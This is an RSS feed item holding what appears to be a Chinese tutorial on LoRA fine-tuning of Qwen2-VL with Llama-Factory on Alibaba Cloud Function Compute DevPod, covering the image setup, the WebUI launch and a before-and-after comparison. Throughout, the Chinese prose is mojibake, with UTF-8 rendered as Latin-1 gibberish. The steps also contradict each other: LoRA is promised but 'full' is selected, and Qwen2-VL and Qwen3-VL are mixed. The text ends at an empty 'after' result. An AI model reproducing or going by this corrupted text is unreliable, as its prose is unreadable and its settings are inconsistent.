<p>ç‚¹å‡»<a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.bilibili.com%2Fvideo%2FBV1AWSxBqEtQ%2F" target="_blank" title="https://www.bilibili.com/video/BV1AWSxBqEtQ/" ref="nofollow noopener noreferrer">æ­¤å¤„</a>æŸ¥çœ‹è§†é¢‘æ¼”ç¤ºã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[æå®šå¤šæ¨¡æ€å¾®è°ƒåªéœ€ä¸€æ¯å’–å•¡çš„æ—¶é—´ï¼ŸFC DevPod + Llama-Factory æé€Ÿå®æˆ˜]]></title>    <link>https://juejin.cn/post/7581678301215817728</link>    <guid>https://juejin.cn/post/7581678301215817728</guid>    <pubDate>2025-12-09T09:24:47.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7581678301215817728" data-draft-id="7581664445240950799" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="æå®šå¤šæ¨¡æ€å¾®è°ƒåªéœ€ä¸€æ¯å’–å•¡çš„æ—¶é—´ï¼ŸFC DevPod + Llama-Factory æé€Ÿå®æˆ˜"/> <meta itemprop="keywords" content="äº‘è®¡ç®—,äº‘åŸç”Ÿ"/> <meta itemprop="datePublished" content="2025-12-09T09:24:47.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="Serverlessç¤¾åŒº"/> <meta itemprop="url" content="https://juejin.cn/user/1794004139382301"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            æå®šå¤šæ¨¡æ€å¾®è°ƒåªéœ€ä¸€æ¯å’–å•¡çš„æ—¶é—´ï¼ŸFC DevPod + Llama-Factory æé€Ÿå®æˆ˜
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1794004139382301/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    Serverlessç¤¾åŒº
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-09T09:24:47.000Z" title="Tue Dec 09 2025 09:24:47 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-09
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    2
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»9åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>ä½œä¸ºä¸€ä¸ª AI å¼€å‘è€…ï¼Œä½ ä¸€å®šç»å†è¿‡è¿™æ ·çš„ç»æœ›æ—¶åˆ»ï¼š å…´è‡´å‹ƒå‹ƒåœ°ä¸‹è½½äº†æœ€æ–°çš„ Qwen2-VL æƒé‡ï¼Œå‡†å¤‡ç”¨è‡ªå·±çš„å‚ç›´é¢†åŸŸæ•°æ®è·‘ä¸€æ¬¡ SFTï¼ˆç›‘ç£å¾®è°ƒï¼‰ã€‚ç„¶è€Œï¼Œç°å®å´æ˜¯æ®‹é…·çš„â€”â€”</p>
<ul>
<li><code>RuntimeError: CUDA out of memory</code> â€”â€” æ˜¾å­˜ä¸å¤Ÿï¼Œæ¨¡å‹åŠ è½½å¤±è´¥ã€‚</li>
<li><code>Driver/Library version mismatch</code> â€”â€” é©±åŠ¨ç‰ˆæœ¬ä¸å¯¹ï¼Œç¯å¢ƒé…ç½®é™·å…¥æ­»å¾ªç¯ã€‚</li>
<li>çœ‹ç€äº‘å‚å•† GPU å®ä¾‹é«˜æ˜‚çš„åŒ…æœˆè´¦å•ï¼ŒçŠ¹è±«ç€è¦ä¸è¦ä¸ºäº†è¿™å‡ å°æ—¶çš„å®éªŒæŒ‰ä¸‹â€œè´­ä¹°â€é”®ã€‚</li>
</ul>
<p>æŠ€æœ¯çš„è¿›æ­¥æœ¬è¯¥æ˜¯ä¸ºäº†é‡Šæ”¾åˆ›é€ åŠ›ï¼Œè€Œä¸æ˜¯å¢åŠ é—¨æ§›ã€‚åœ¨ Serverless æ—¶ä»£ï¼Œç®—åŠ›åº”è¯¥åƒæ°´ç”µä¸€æ ·ï¼Œæ‰­å¼€æ°´é¾™å¤´å°±æœ‰ï¼Œå…³ä¸Šå°±åœï¼ŒæŒ‰éœ€ä»˜è´¹ã€‚</p>
<p>ä»Šå¤©ï¼Œæˆ‘ä»¬å°†æ‰“ç ´â€œå¾®è°ƒ=æ˜‚è´µ+éº»çƒ¦â€çš„åˆ»æ¿å°è±¡ã€‚ä¸éœ€è¦å›¤ç§¯æ˜¾å¡ï¼Œä¹Ÿä¸éœ€è¦ç²¾é€šè¿ç»´ï¼Œæˆ‘ä»¬å°†å¸¦ä½ ä½“éªŒä¸€å¥—â€œ<strong>DevPod + Llama-Factoryçš„æé€Ÿç»„åˆæ‹³</strong>â€ã€‚</p>
<h3 data-id="heading-0">ä¸€ã€æ–¹æ¡ˆæ­ç§˜ï¼šFC + Llama-Factory çš„â€œé»„é‡‘æ­æ¡£â€</h3>
<p>å·¥æ¬²å–„å…¶äº‹ï¼Œå¿…å…ˆåˆ©å…¶å™¨ã€‚åœ¨å¼€å§‹å®æˆ˜ä¹‹å‰ï¼Œè®©æˆ‘ä»¬å…ˆæ‹†è§£ä¸€ä¸‹è¿™å¥—â€œå¼€ç®±å³ç”¨â€çš„å¾®è°ƒæµæ°´çº¿èƒŒåçš„ä¸‰ä½ä¸»è§’ã€‚å½“å®ƒä»¬åœ¨ Serverless æ¶æ„ä¸‹ç›¸é‡ï¼Œå¤æ‚çš„æ¨¡å‹è®­ç»ƒå°±å˜æˆäº†ä¸€åœºæµç•…çš„æ­ç§¯æœ¨æ¸¸æˆã€‚</p>
<h4 data-id="heading-1">1. ä¸»è§’ï¼šQwen VL æ¨¡å‹ â€”â€” å¤šæ¨¡æ€é¢†åŸŸçš„â€œå…­è¾¹å½¢æˆ˜å£«â€</h4>
<ul>
<li><strong>çœ‹å¾—æ›´æ¸…</strong>ï¼š å®ƒä¸ä»…èƒ½è¯†åˆ«å›¾ç‰‡ä¸­çš„ç‰©ä½“ï¼Œè¿˜èƒ½ç²¾å‡†æå–å¤æ‚çš„å›¾è¡¨æ•°æ®ã€é˜…è¯»å¯†é›†çš„æ–‡æ¡£æ–‡å­—ï¼ˆOCRï¼‰ï¼Œç”šè‡³ç†è§£é•¿è§†é¢‘ä¸­çš„æ—¶åºé€»è¾‘ã€‚</li>
<li><strong>æ‡‚ä½ æ‰€æƒ³</strong>ï¼š åœ¨æŒ‡ä»¤éµå¾ªï¼ˆInstruction Followingï¼‰èƒ½åŠ›ä¸Šå¤§å¹…å¢å¼ºï¼Œè¿™æ„å‘³ç€é€šè¿‡å¾®è°ƒï¼Œä½ å¯ä»¥æ›´å®¹æ˜“åœ°è®©å®ƒå­¦ä¼šä½ ç‰¹å®šä¸šåŠ¡åœºæ™¯ä¸‹çš„â€œè¡Œè¯â€å’Œè§„åˆ™ã€‚</li>
<li><strong>ä»·å€¼ç‚¹</strong>ï¼š é€‰æ‹© Qwen2-VLï¼Œæ„å‘³ç€ä½ çš„èµ·ç‚¹å·²ç»æ˜¯è¡Œä¸šé¡¶å°–æ°´å¹³ï¼Œå¾®è°ƒåªæ˜¯ä¸ºäº†è®©å®ƒæ›´æ‡‚ä½ çš„ç§æœ‰æ•°æ®ã€‚</li>
</ul>
<h4 data-id="heading-2">2. å·¥å…·ï¼šLlama-Factory â€”â€” å¾®è°ƒç•Œçš„â€œç‘å£«å†›åˆ€â€</h4>
<p>å¯¹äºè®¸å¤šå¼€å‘è€…æ¥è¯´ï¼Œå¾®è°ƒæœ€å¤§çš„é—¨æ§›ä¸æ˜¯ä¸æ‡‚åŸç†ï¼Œè€Œæ˜¯ä¸æƒ³å†™é‚£å‡ åƒè¡Œçš„ PyTorch è®­ç»ƒä»£ç ã€‚Llama-Factory çš„å‡ºç°ï¼Œå®Œç¾è§£å†³äº†è¿™ä¸ªé—®é¢˜ã€‚</p>
<ul>
<li><strong>é›¶ä»£ç é—¨æ§›</strong>ï¼š å®ƒæä¾›äº†ä¸€ä¸ªåŠŸèƒ½å®Œå¤‡çš„ WebUI ç•Œé¢ã€‚åŠ è½½æ¨¡å‹ã€é…ç½®å‚æ•°ã€ç›‘æ§ Loss æ›²çº¿ã€è¯„ä¼°æ•ˆæœï¼Œæ‰€æœ‰æ“ä½œéƒ½å¯ä»¥åœ¨æµè§ˆå™¨ä¸­é€šè¿‡ç‚¹å‡»å®Œæˆã€‚</li>
<li><strong>å…¨æµç¨‹è¦†ç›–</strong>ï¼š ä»é¢„è®­ç»ƒï¼ˆPTï¼‰ã€æŒ‡ä»¤ç›‘ç£å¾®è°ƒï¼ˆSFTï¼‰åˆ°å¥–åŠ±æ¨¡å‹è®­ç»ƒï¼ˆRMï¼‰å’Œ PPO/DPOï¼Œå®ƒé›†æˆäº†ä¸šç•Œæœ€ä¸»æµçš„å¾®è°ƒæ–¹æ³•ï¼ˆå¦‚ LoRAã€QLoRAï¼‰ã€‚</li>
<li><strong>ä»·å€¼ç‚¹</strong>ï¼š å®ƒå±è”½äº†åº•å±‚ DeepSpeedã€Accelerate ç­‰æ¡†æ¶çš„å¤æ‚é…ç½®ï¼Œè®©ä½ èƒ½æŠŠç²¾åŠ›é›†ä¸­åœ¨â€œæ•°æ®è´¨é‡â€å’Œâ€œæ¨¡å‹æ•ˆæœâ€ä¸Šã€‚</li>
</ul>
<h4 data-id="heading-3">3. èˆå°ï¼šé˜¿é‡Œäº‘å‡½æ•°è®¡ç®— FC â€”â€” ä¸º AI è€Œç”Ÿçš„ Serverless ç®—åŠ›</h4>
<p>æœ‰äº†å¥½æ¨¡å‹å’Œå¥½å·¥å…·ï¼Œæˆ‘ä»¬è¿˜éœ€è¦ä¸€ä¸ªèƒ½è·‘å¾—åŠ¨å®ƒä»¬çš„â€œèˆå°â€ã€‚ä¼ ç»Ÿçš„ GPU æœåŠ¡å™¨ç§Ÿèµæ¨¡å¼å¾€å¾€é¢ä¸´â€œéƒ¨ç½²éš¾ã€é—²ç½®è´µâ€çš„å°´å°¬ï¼Œè€Œ <strong>å‡½æ•°è®¡ç®— FC</strong> ç»™å‡ºäº†å…¨æ–°çš„è§£æ³•ï¼š</p>
<ul>
<li><strong>æè‡´å¼¹æ€§ï¼ŒæŒ‰é‡ä»˜è´¹</strong>ï¼š è¿™æ˜¯ Serverless çš„çµé­‚ã€‚ä½ åªéœ€è¦ä¸ºè®­ç»ƒçš„é‚£å‡ ä¸ªå°æ—¶ä»˜è´¹ã€‚è®­ç»ƒç»“æŸï¼Œå®ä¾‹å¯è½»æ¾é‡Šæ”¾ï¼Œä¸å†äº§ç”Ÿä»»ä½•é—²ç½®è´¹ç”¨ã€‚å¯¹äºå®éªŒæ€§è´¨çš„å¾®è°ƒä»»åŠ¡ï¼Œæˆæœ¬å¯ä»¥é™ä½ 50% ä»¥ä¸Šã€‚</li>
<li><strong>ç¯å¢ƒé¢„ç½®ï¼Œæ‹’ç»â€œé…ç¯å¢ƒâ€</strong>ï¼š æˆ‘ä»¬åœ¨ FC çš„åº”ç”¨ä¸­å¿ƒé¢„ç½®äº†åŒ…å« CUDAã€PyTorch ä»¥åŠ Llama-Factory ä¾èµ–çš„å®˜æ–¹é•œåƒã€‚è¿™ä¸€æ­¥è‡³å…³é‡è¦â€”â€”å®ƒæ„å‘³ç€ä½ ä¸éœ€è¦å¤„ç†ä»»ä½•é©±åŠ¨å†²çªï¼Œç‚¹å‡»éƒ¨ç½²ï¼Œç¯å¢ƒå³åˆ»å°±ç»ªã€‚</li>
<li><strong>å¼‚æ„ç®—åŠ›æ”¯æŒ</strong>ï¼š FC æä¾›äº†ä¸°å¯Œçš„ GPU è§„æ ¼ä¾›ä½ é€‰æ‹©ï¼Œæ»¡è¶³ä¸åŒè§„æ¨¡çš„å¾®è°ƒéœ€æ±‚ã€‚</li>
</ul>
<p><img src="https://intranetproxy.alipay.com/skylark/lark/0/2025/png/324184/1764920834972-bea889e5-125a-40b0-8c3d-f240f7ee45d7.png" alt="" loading="lazy"/></p>
<p><em>â€œå½“ Llama-Factory çš„å¯è§†åŒ–äº¤äº’é‡ä¸Š FC çš„æè‡´å¼¹æ€§ï¼Œå¾®è°ƒ Qwen2-VL å°±å˜æˆäº†ä¸€åœºâ€˜ç‚¹å‡»å³å¾—â€™çš„æµç•…ä½“éªŒã€‚æˆ‘ä»¬ä¸å†éœ€è¦åƒè¿ç»´å·¥ç¨‹å¸ˆä¸€æ ·ç›¯ç€é»‘åº•ç™½å­—çš„ç»ˆç«¯çª—å£ï¼Œè€Œæ˜¯å¯ä»¥åƒä¿®å›¾å¸ˆä¸€æ ·ï¼Œåœ¨ Web ç•Œé¢ä¸Šä¼˜é›…åœ°æ‰“ç£¨æˆ‘ä»¬çš„æ¨¡å‹ã€‚â€</em></p>
<h3 data-id="heading-4">äºŒã€æé€Ÿéƒ¨ç½²ï¼š5åˆ†é’Ÿæ­å»ºå¾®è°ƒæµæ°´çº¿</h3>
<p>ä¼ ç»Ÿå¾®è°ƒçš„ç¬¬ä¸€æ­¥é€šå¸¸æ˜¯â€œç§ŸæœåŠ¡å™¨ã€è£…é©±åŠ¨ã€é…ç¯å¢ƒâ€ï¼Œè€Œåœ¨ Serverless æ¶æ„ä¸‹ï¼Œæˆ‘ä»¬ç›´æ¥ä»â€œåº”ç”¨â€å¼€å§‹ã€‚</p>
<p><strong>Step 1ï¼šDevPod å¼€å‘ç¯å¢ƒä¸€é”®æ‹‰èµ·</strong></p>
<p>ç™»å½• Function AI æ§åˆ¶å° - FunModel - æ¨¡å‹å¸‚åœºï¼Œç‚¹å‡»é¡µé¢çš„ã€Œè‡ªå®šä¹‰å¼€å‘ã€ï¼Œåœ¨ã€Œæ¨¡å‹ç¯å¢ƒä¸‹ã€é€‰æ‹©ã€Œè‡ªå®šä¹‰ç¯å¢ƒã€ï¼Œåœ¨å®¹å™¨é•œåƒåœ°å€ä¸­å¡«å…¥ <code>serverless-registry.cn-hangzhou.cr.aliyuncs.com/functionai/devpod-presets:llama-factory-v0.9.4-v1</code>ã€‚è¯¥é•œåƒå·²å†…ç½® llama-factory v0.9.4 çš„ç‰ˆæœ¬ã€‚</p>
<p><img src="https://intranetproxy.alipay.com/skylark/lark/0/2025/png/324184/1764309769776-6be9d8e1-42bd-482e-934c-f4c1270a059a.png" alt="" loading="lazy"/></p>
<p><strong>Step 2ï¼šèµ„æºä¸å­˜å‚¨é…ç½®ï¼ˆå…³é”®ä¸€æ­¥ï¼‰</strong></p>
<p>åªéœ€å…³æ³¨ GPU ç±»å‹ã€‚å¯¹äº Qwen3-VL çš„ LoRA å¾®è°ƒï¼Œæ¨èé€‰æ‹© GPU æ€§èƒ½å‹å•å¡å³å¯æ»¡è¶³éœ€æ±‚ï¼Œæ€§ä»·æ¯”æé«˜ã€‚</p>
<p><img src="https://intranetproxy.alipay.com/skylark/lark/0/2025/png/324184/1764309771303-bb94fc91-4553-4824-9e16-1aebd786bafb.png" alt="" loading="lazy"/></p>
<p><strong>Step 3ï¼šä¸€é”®æ‹‰èµ·ç¯å¢ƒï¼Œç‚¹å‡»ã€ŒDevPod å¼€å‘è°ƒè¯•ã€</strong></p>
<p>FC ä¼šè‡ªåŠ¨æ‹‰å–åŒ…å« CUDA ç¯å¢ƒå’Œ Llama-Factory æ¡†æ¶çš„é•œåƒã€‚å¤§çº¦ç­‰å¾… 1-3 åˆ†é’Ÿï¼Œé¡µé¢è‡ªåŠ¨è·³è½¬åˆ° DevPod é¡µé¢ï¼Œæˆ‘ä»¬è¿›å…¥ Terminal ä¸‹ï¼Œæ‰§è¡Œå‘½ä»¤ <code>USE_MODELSCOPE_HUB=1 lmf webui</code> å¯åŠ¨ llama-factory çš„è¿›ç¨‹ã€‚</p>
<p><img src="https://intranetproxy.alipay.com/skylark/lark/0/2025/png/324184/1764311554203-e01da0d8-41d7-413a-a475-5574bbbe597e.png" alt="" loading="lazy"/></p>
<p><img src="https://intranetproxy.alipay.com/skylark/lark/0/2025/png/324184/1764904990655-635739b1-78ea-4d9c-b102-58f29333e330.png" alt="" loading="lazy"/></p>
<p>æ ¹æ®ã€Œå¿«é€Ÿè®¿é—®ã€é¡µç­¾çš„æç¤ºï¼Œå°† uri ä¸­çš„ <code>{port}</code> æ›¿æ¢ä¸º 7860 å³å¯ï¼ˆllama-factory é»˜è®¤ä½¿ç”¨ 7860 ç«¯å£ï¼‰ã€‚ç›´æ¥ä½¿ç”¨è¯¥ uri åœ¨æµè§ˆå™¨è¿›è¡Œè®¿é—®ï¼Œè¿›å…¥ llama-factory çš„ webui ç•Œé¢ã€‚</p>
<p><img src="https://intranetproxy.alipay.com/skylark/lark/0/2025/png/324184/1764311896481-61d3a02e-bc06-4376-b7e9-6d1ea0ba451f.png" alt="" loading="lazy"/></p>
<p><img src="https://intranetproxy.alipay.com/skylark/lark/0/2025/png/324184/1764311983575-ac8fe220-6ffb-4c1a-a4cc-b63f3a1421ae.png" alt="" loading="lazy"/></p>
<h3 data-id="heading-5">ä¸‰ã€å®æˆ˜ SFTï¼šåƒ P å›¾ä¸€æ ·ç®€å•åœ°å¾®è°ƒæ¨¡å‹</h3>
<p>æ‰“å¼€ WebUI ç•Œé¢ï¼Œä½ ä¼šå‘ç°å¾®è°ƒå¤§æ¨¡å‹å¹¶ä¸æ¯”ä½¿ç”¨ Photoshop å¤æ‚å¤šå°‘ã€‚æˆ‘ä»¬ä¸éœ€è¦æ•²ä¸€è¡Œ Python ä»£ç ï¼Œåªéœ€åœ¨é¢æ¿ä¸Šè¿›è¡Œâ€œå‹¾é€‰â€å’Œâ€œå¡«ç©ºâ€ã€‚</p>
<p><strong>Step 1ï¼šæ¨¡å‹ä¸æ•°æ®å‡†å¤‡</strong></p>
<ul>
<li><strong>æ¨¡å‹åç§°</strong>ï¼š åœ¨ä¸‹æ‹‰èœå•ä¸­é€‰æ‹© <code>Qwen2-VL</code>ï¼ˆæˆ–æ‰‹åŠ¨è¾“å…¥æ¨¡å‹è·¯å¾„ï¼‰ã€‚</li>
<li><strong>æ•°æ®é›†</strong>ï¼š Llama-Factory æ”¯æŒæ ‡å‡†çš„ Alpaca æ ¼å¼æˆ– ShareGPT æ ¼å¼ã€‚å¯¹äºå¤šæ¨¡æ€ä»»åŠ¡ï¼Œç¡®ä¿ä½ çš„ JSON æ–‡ä»¶ä¸­åŒ…å«å›¾ç‰‡è·¯å¾„ã€‚
<ul>
<li>æ“ä½œï¼š åœ¨ WebUI çš„â€œæ•°æ®é›†â€é€‰é¡¹ä¸­é€‰æ‹©å‡†å¤‡å¥½çš„æ•°æ®é›†ï¼Œæœ¬æ–‡çš„æ•°æ®é›†è·¯å¾„å¦‚å›¾æ‰€ç¤ºï¼š</li>
</ul>
</li>
</ul>
<p><img src="https://intranetproxy.alipay.com/skylark/lark/0/2025/png/324184/1764906712487-485f0c15-df14-4ef3-b93a-a967d71b9232.png" alt="" loading="lazy"/></p>
<p><strong>Step 2ï¼šå‚æ•°é…ç½®ï¼ˆLoRAå¤§æ³•å¥½ï¼‰</strong>
ä¸ºäº†åœ¨ Serverless ç¯å¢ƒä¸‹é«˜æ•ˆå¾®è°ƒï¼Œæˆ‘ä»¬é‡‡ç”¨ <strong>LoRA (Low-Rank Adaptation)</strong> æŠ€æœ¯ã€‚å®ƒåªè®­ç»ƒæ¨¡å‹çš„ä¸€å°éƒ¨åˆ†å‚æ•°ï¼Œå´èƒ½è¾¾åˆ°æƒŠäººçš„æ•ˆæœã€‚</p>
<ul>
<li><strong>å¾®è°ƒæ–¹æ³•</strong>ï¼š å‹¾é€‰ <code>full</code>ã€‚</li>
<li><strong>å­¦ä¹ ç‡ (Learning Rate)</strong>ï¼š æ¨è <code>1e-4</code> æˆ– <code>5e-5</code>ã€‚</li>
<li><strong>è½®æ•° (Epochs)</strong>ï¼š å»ºè®®å…ˆè®¾ä¸º <code>3</code> æˆ– <code>5</code> è½®ï¼Œå¿«é€ŸéªŒè¯æ•ˆæœã€‚</li>
</ul>
<p><img src="https://intranetproxy.alipay.com/skylark/lark/0/2025/png/324184/1764919107775-84667310-a6a8-486b-81ce-3918aed478f6.png" alt="" loading="lazy"/></p>
<p><strong>Step 3ï¼šå¯åŠ¨è®­ç»ƒä¸ç›‘æ§</strong>
ä¸€åˆ‡å°±ç»ªï¼Œç‚¹å‡»é²œè‰³çš„ <strong>â€œå¼€å§‹è®­ç»ƒâ€</strong> æŒ‰é’®ã€‚ ç•Œé¢ä¸‹æ–¹ä¼šè‡ªåŠ¨å¼¹å‡ºæ—¥å¿—çª—å£å’Œ Lossï¼ˆæŸå¤±ï¼‰æ›²çº¿å›¾ã€‚çœ‹ç€ Loss æ›²çº¿åƒæ»‘æ¢¯ä¸€æ ·ç¨³æ­¥ä¸‹é™ï¼Œä»£è¡¨æ¨¡å‹æ­£åœ¨åŠªåŠ›å­¦ä¹ ä½ æ•™ç»™å®ƒçš„æ–°çŸ¥è¯†ã€‚</p>
<p><img src="https://intranetproxy.alipay.com/skylark/lark/0/2025/png/324184/1764907126625-4da053fa-0abb-4632-851b-9b245f8d8cdf.png" alt="" loading="lazy"/></p>
<h3 data-id="heading-6">å››ã€æ•ˆæœéªŒè¯ä¸æ¨¡å‹å¯¼å‡ºï¼šè§è¯â€œä¸“å®¶â€è¯ç”Ÿ</h3>
<p>çœ‹ç€ Loss æ›²çº¿æ”¶æ•›åªæ˜¯ç¬¬ä¸€æ­¥ï¼ŒçœŸæ­£çš„è€ƒéªŒåœ¨äºï¼šå®ƒçœŸçš„å˜èªæ˜äº†å—ï¼ŸLlama-Factory è´´å¿ƒåœ°é›†æˆäº†è¯„ä¼°ä¸æ¨ç†æ¨¡å—ï¼Œè®©æˆ‘ä»¬èƒ½å³æ—¶éªŒæ”¶æˆæœã€‚</p>
<p><strong>Step 1ï¼šChat é¡µç­¾åœ¨çº¿æ¨ç†</strong>
è®­ç»ƒå®Œæˆåï¼Œæ— éœ€é‡å¯æœåŠ¡ï¼Œç›´æ¥ç‚¹å‡» WebUI é¡¶éƒ¨çš„ <strong>â€œChatâ€</strong> é¡µç­¾ã€‚</p>
<ul>
<li><strong>æ£€æŸ¥ç‚¹é€‰æ‹©</strong>ï¼š åœ¨ <code>Checkpoint</code> ä¸‹æ‹‰æ¡†ä¸­ï¼Œé€‰æ‹©åˆšæ‰è®­ç»ƒå¥½çš„ Adapter æƒé‡ã€‚</li>
<li><strong>åŠ è½½æ¨¡å‹</strong>ï¼š ç‚¹å‡»â€œåŠ è½½æ¨¡å‹â€ï¼Œå‡ ç§’é’Ÿåï¼Œå³ä¸‹è§’æ˜¾ç¤ºâ€œæ¨¡å‹åŠ è½½æˆåŠŸâ€ã€‚</li>
</ul>
<p><img src="https://intranetproxy.alipay.com/skylark/lark/0/2025/png/324184/1764920037265-e11f655b-19bb-4c0b-b062-1aaa7ac37219.png" alt="" loading="lazy"/></p>
<p><strong>Step 2ï¼šå¾®è°ƒå‰åæ•ˆæœâ€œå¤§æ¯”æ­¦â€</strong>
ä¸ºäº†éªŒè¯æ•ˆæœï¼Œæˆ‘ä»¬ä¸Šä¼ ä¸€å¼ ç‰¹å®šä¸šåŠ¡åœºæ™¯çš„å›¾ç‰‡ï¼ˆä¾‹å¦‚ä¸€å¼ å¤æ‚çš„æŠ¥é”€å•æ®ï¼‰ï¼Œå¹¶è¾“å…¥åŒæ ·çš„ Promptï¼šâ€œè¯·æå–å›¾ä¸­çš„å…³é”®ä¿¡æ¯â€ã€‚</p>
<p>å¾®è°ƒå‰ï¼š</p>
<p><img src="https://intranetproxy.alipay.com/skylark/lark/0/2025/png/324184/1764920105262-a2df3466-1da2-4c75-bd35-94a92e6b7a18.png" alt="" loading="lazy"/></p>
<p>å¾®è°ƒåï¼š</p>
